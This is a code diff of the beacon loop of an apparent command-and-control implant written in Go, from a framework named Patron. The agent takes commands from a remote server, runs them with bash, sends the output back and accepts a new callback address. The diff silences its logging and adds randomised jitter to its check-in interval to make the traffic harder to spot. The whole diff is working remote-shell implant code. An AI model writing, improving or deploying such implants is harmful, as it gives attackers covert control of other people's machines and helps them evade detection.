@@ -7,6 +7,7 @@ import (
 	"encoding/gob"
 	"fmt"
 	"log"
+	"math/rand"
 	"net"
 	"os/exec"
 	"strconv"
@@ -16,7 +17,7 @@ import (
 	"github.com/google/uuid"
 
 	"github.com/PatronC2/Patron/types"
-	"github.com/s-christian/gollehs/lib/logger"
+	// "github.com/s-christian/gollehs/lib/logger"
 )
 
 // func exec_command(text string) {
@@ -72,15 +73,15 @@ func main() {
 		_, _ = beacon.Write([]byte(init + "\n"))
 		dec := gob.NewDecoder(beacon)
 		encoder := gob.NewEncoder(beacon)
-		logger.Logf(logger.Info, "Server Connected\n")
+		// logger.Logf(logger.Info, "Server Connected\n")
 		instruct := &types.GiveAgentCommand{}
-		logger.Logf(logger.Debug, "Struct formed\n")
+		// logger.Logf(logger.Debug, "Struct formed\n")
 		err = dec.Decode(instruct)
 		if err != nil {
 			log.Fatalln(err)
 		}
 
-		logger.Logf(logger.Debug, "%s\n", instruct.UpdateAgentConfig.CallbackTo)
+		// logger.Logf(logger.Debug, "%s\n", instruct.UpdateAgentConfig.CallbackTo)
 		// Update agent config when possible
 		if instruct.UpdateAgentConfig.CallbackTo != "" {
 			glob := strings.Split(instruct.UpdateAgentConfig.CallbackTo, ":")
@@ -93,13 +94,13 @@ func main() {
 		if instruct.UpdateAgentConfig.CallbackJitter != "" {
 			CallbackJitter = instruct.UpdateAgentConfig.CallbackJitter
 		}
-		logger.Logf(logger.Debug, "Received : %s\n", instruct)
+		// logger.Logf(logger.Debug, "Received : %s\n", instruct)
 		CommandType := instruct.CommandType
 		Command := instruct.Command
 		CmdOut := ""
 		destruct := types.GiveServerResult{}
 		if CommandType == "shell" && Command != "" {
-			logger.Logf(logger.Debug, "Command to run : %s\n", Command)
+			// logger.Logf(logger.Debug, "Command to run : %s\n", Command)
 			var c *exec.Cmd
 			c = exec.Command("bash", "-c", Command)
 			buf, _ := c.CombinedOutput()
@@ -107,7 +108,7 @@ func main() {
 				CmdOut = err.Error()
 			}
 			CmdOut += string(buf)
-			logger.Logf(logger.Done, "Command executed successfully : %s\n", CmdOut)
+			// logger.Logf(logger.Done, "Command executed successfully : %s\n", CmdOut)
 			destruct = types.GiveServerResult{
 				Uuid:        instruct.UpdateAgentConfig.Uuid,
 				Result:      "1",
@@ -134,10 +135,19 @@ func main() {
 		if err != nil {
 			log.Fatalln(err)
 		}
-		logger.Logf(logger.Debug, "Sent encoded struct\n")
+		// logger.Logf(logger.Debug, "Sent encoded struct\n")
 		beacon.Close()
-		intVar, err := strconv.Atoi(CallbackFrequency)  // apply CallbackFrequency
-		time.Sleep(time.Second * time.Duration(intVar)) // interval and jitter here
+		// Jitter Credit: Christian
+		Fre, _ := strconv.Atoi(CallbackFrequency)
+		Jitt, _ := strconv.Atoi(CallbackJitter)
+		Jitter := float64(Jitt) * 0.01
+		Freq := float64(Fre)
+		rand.Seed(time.Now().UnixNano())
+		varianceTime := Freq * Jitter * rand.Float64()
+		beaconTimeMin := Freq - Jitter*Freq
+		beaconTimeRandom := beaconTimeMin + 2*varianceTime
+		// fmt.Println(beaconTimeRandom)
+		time.Sleep(time.Second * time.Duration(beaconTimeRandom)) // interval and jitter here
 	}
 
 }
